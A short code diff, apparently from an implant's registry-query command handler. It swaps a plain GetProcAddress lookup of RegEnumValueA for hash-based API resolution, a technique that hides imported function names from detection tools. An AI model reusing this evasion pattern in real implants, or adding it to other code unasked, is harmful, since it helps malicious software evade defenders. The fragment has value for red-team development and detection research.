@@ -114,9 +114,9 @@ auto declfn starburst::cmd_reg_query(
         typedef LSTATUS ( WINAPI *fn_RegEnumValueA )(
             HKEY, DWORD, LPSTR, LPDWORD, LPDWORD, LPDWORD, LPBYTE, LPDWORD );
         auto pRegEnumValueA = reinterpret_cast<fn_RegEnumValueA>(
-            inst.kernel32.GetProcAddress(
-                (HMODULE)inst.advapi32.handle,
-                symbol<LPCSTR>( "RegEnumValueA" ) ) );
+            resolve::_api(
+                reinterpret_cast<uintptr_t>( (HMODULE)inst.advapi32.handle ),
+                expr::hash_string( "RegEnumValueA" ) ) );
         if ( !pRegEnumValueA ) break;
 
         name_len = sizeof( name_buf );
